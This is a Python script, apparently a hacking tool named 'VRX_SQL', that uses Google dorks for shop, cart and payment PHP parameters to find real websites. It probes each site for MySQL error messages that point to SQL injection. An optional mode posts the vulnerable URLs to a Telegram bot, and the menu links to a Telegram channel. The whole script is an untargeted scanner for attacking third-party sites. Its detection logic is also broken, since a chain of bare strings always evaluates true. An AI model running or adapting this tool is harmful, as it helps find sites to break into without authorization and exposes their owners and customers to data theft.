import pyfiglet
import requests
import random
from googlesearch import search
b = '\33[1;30m'
R = '\33[1;31m'
G = '\33[1;32m'
O = '\33[1;33m'
B = '\33[1;34m'
P = '\33[1;35m'
C = '\33[1;36m'
l = '\33[1;45m'
import os
try:
    import webbrowser
    import telebot
except ImportError:
    print('Error in importing libraries')

bnrx = pyfiglet.figlet_format("            VRX_SQL")
print(P + bnrx)
print(f' {b}dev : {O}V_R_X_M_3                                           ')
print(f' {b}from : {C}𝐹𝑅3𝑂𝑁 \n')

kay9 = "shop.php?action="
kay1 = "buy.php?bookid"
key2 = "news.php?id="
key3 = "buy.php?category="
key4 = "viewcart.php?CartId="
key5 = "shop.php?a="
key6 = "payment.php?CartID="
kay = "php?id=1"
totl = [kay9,kay1,kay,key2,key3,key4,key5,key6]
rnd = random.choice(totl)
def terminal():
    os.system('clear')
    num0 = int(input(' HOW MANY SITE YOU WANT [100-1000] : '))
    for i in search(rnd, stop=num0):
        try:
            req = requests.get(i + rnd)
            msg = "your SQL"
            if msg in req.text:
                url = requests.get(f'{i},').text
                if (
                    'You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax'
                    or 'You have an error in your SQL syntax'
                    or "your MySQL server version for the right syntax to use near '' at line 1"
                    or 'your MySQL server version for the right syntax '
                    or "You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ' limit 0,1' at line 1"
                    or 'server version for the right syntax to use' in url
                ):
                    print(G + "[✓] website SQL !")
                    print(G + i)
                else:
                    print(R + 'NOT SQL !!')
            else:
                print(R + "[*] website NO SQL !")
        except:
            print(B + "WAIT A SECOND !!!!!!")




def tele():
    token = input(f'{b} ENTER YOUR TOKEN : ')
    idtl = input(f'{b} ENTER YOUR ID : ')
    os.system('clear')
    tlg1 = 'MTX , THIS A ULRS HAVE SQL INJ '
    tlg = (f'''https://api.telegram.org/bot{token}/sendMessage?chat_id={idtl}&text={tlg1}''')
    requests.post(tlg)
    num = int(input(P+' HOW MANY SITE YOU WANT [100-1000] : '))
    for i in search(rnd,stop=num):
        try:
            req = requests.get(i +rnd)
            msg = "your SQL"
            if msg in req.text:
                url = requests.get(f'{i},').text
                if (
                    'You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax'
                    or 'You have an error in your SQL syntax'
                    or "your MySQL server version for the right syntax to use near '' at line 1"
                    or 'your MySQL server version for the right syntax '
                    or "You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ' limit 0,1' at line 1"
                    or 'server version for the right syntax to use' in url
                ):
                    print(G + "[✓] website SQL !")
                    print(G + i)
                    
                    tlg3 = f'{i}'
                    tlg0 = (f'''https://api.telegram.org/bot{token}/sendMessage?chat_id={idtl}&text={tlg3}''')
                    requests.post(tlg0)
                else:
                    print(R + 'NOT SQL !!')
            else:
                print(R + "[*] website NO SQL !")
        except:
            print(B + "INTERNET!!!!!!")
                                     
                                                             
def choos():
	msg = f'{O} [1] SQL WITH TERMINAL\n{C} [2] SQL WITH TELEGRAM BOT\n {B}[3] OUR CHANNEL '
	print(msg)
	ch = input(P +'\n  ENTER YOUR CHOOISE : ')
	if ch == '1':
		terminal()
	elif ch == '2':
		tele()
	elif ch == '3':
		webbrowser.open('https://t.me/blackd42')
		os.system('clear')
		bnrx = pyfiglet.figlet_format("            MTX SQL")
		print(P + bnrx)
		print(f' {b}dev : {O}M_T_X_0                                            ')
		print(f' {b}from : {C}blackd42 \n')
		
		choos()
	else:
		os.system('clear')
		print(R+'YOU CHOOIS NOT EXISTID !!')

	
choos()
